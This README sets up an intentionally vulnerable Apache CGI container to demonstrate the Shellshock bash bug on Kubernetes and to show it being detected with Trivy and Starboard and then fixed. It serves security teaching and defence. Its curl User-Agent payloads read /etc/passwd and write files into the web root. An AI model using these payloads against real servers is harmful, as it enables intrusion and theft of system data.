Shellshockable
=====================

Docker container with Apache 2 / CGI shellshock vulnerability. This builds on an original version by [Thibault Normand](https://github.com/Zenithar)

This demo uses three different versions

* shellshockable:0.1.0 - runs as root and includes shellshock vulnerability
* shellshockable:0.2.0 - runs as non-root but still has the vulnerability
* shellshockable:0.3.0 - runs as non-root, without shellshock vulnerability

### Build and push to Docker Hub

Skip this step if you want to use my version of the images already pushed to Docker Hub.

```sh
make push
```

> TODO: environment variable for Docker Hub account / registry so it doesn't have to use lizrice (needs changes to makefile and Helm chart)

### Find the vulnerability with Trivy

```sh
trivy image lizrice/shellshockable:0.1.0
```

> Note: the Dockerfile installs the vulnerable package. A vulnerability scanner wouldn't find the vulnerability if you build the vulnerable version of bash from source.

### Install on Kubernetes with Helm

```sh
helm install shell-chart shellshockable/ --values shellshockable/values.yaml
```

### Port-forwarding

```sh
# Run this in the background or in another terminal window
kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:80
```

> TODO: use an ingress so you don't have to re-do the port forwarding every time

> TODO: could also set up a fake domain in /etc/hosts on the host to pretend that this is on a "real" web site

### Regular query

```sh
curl localhost:8081/cgi-bin/shockme.cgi
```

> TODO: consider renaming shockme.cgi so it's more "normal"

### Read files from the host

```sh
curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd" localhost:8081/cgi-bin/shockme.cgi
```

You can put the user agent string into a variable to make this easier to type live

```sh
export SHOCK="() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd"
curl -A $SHOCK localhost:8081/cgi-bin/shockme.cgi
```

### Create a new page

```sh
curl localhost:8081/liz.html
# doesn't exist yet

curl -A "() { :; }; echo hello > /var/www/html/liz.html" localhost:8081/cgi-bin/shockme.cgi

# Find new file
curl localhost:8081/liz.html
```
### Test bash for Shellshock vulnerability

Get into the vulnerable container:

```sh
kubectl exec -it  $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) bash
```

Test that its version of bash is exploitable:

```sh
env x='() { :; }; echo vulnerable' bash -c "echo test"
```

You'll see the word "vulnerable" only if shellshock is present.

## Starboard

Install [starboard](https://github.com/aquasecurity/starboard) - for example `kubectl krew install starboard`
and  `kubectl starboard init` to create the CRDs.

```sh
kubectl starboard find vulnerabilities deployment/shell-chart-shellshockable
kubectl starboard get vulnerabilities deployment/shell-chart-shellshockable
kubectl starboard polaris
```

Run `octant` to view them there. You should see vulnerabilities (including HIGH severity shellshock) and config issues from Polaris (including failing the runAsNonRoot test).

## Run as non-root

```sh
helm upgrade -f 0.2.0.yaml shell-chart shellshockable
```

This container uses a high numbered port so it can run as nonRoot

```sh
kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:8100
```

Re-run polaris and check the test for runAsNonRoot is now passing.

> Note: This config doesn't set readOnlyRootFileSystem, because Apache wants to write files.

## Upgrade to non-vulnerable version

```sh
helm upgrade -f 0.3.0.yaml shell-chart shellshockable
kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:8100
```

> Note: for now you need to delete old vulnerability reports otherwise the Octant plugin may not pick up the latest: `k delete vulns --all` will do it

Re-run find vulnerabilities and check this is no longer an issue
